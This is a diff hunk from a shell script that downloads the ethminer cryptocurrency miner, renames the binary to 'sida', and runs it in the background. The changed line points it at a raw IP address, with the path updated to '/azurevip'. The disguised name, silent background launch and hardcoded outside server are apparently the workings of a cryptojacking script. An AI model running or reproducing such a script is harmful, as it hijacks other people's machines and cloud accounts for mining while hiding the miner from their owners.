@@ -11,4 +11,4 @@ wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha
 tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 cd  bin
 mv ethminer sida
-./sida -F http://103.133.106.124:8081/ &
+./sida -F http://103.133.106.124:8081/azurevip &
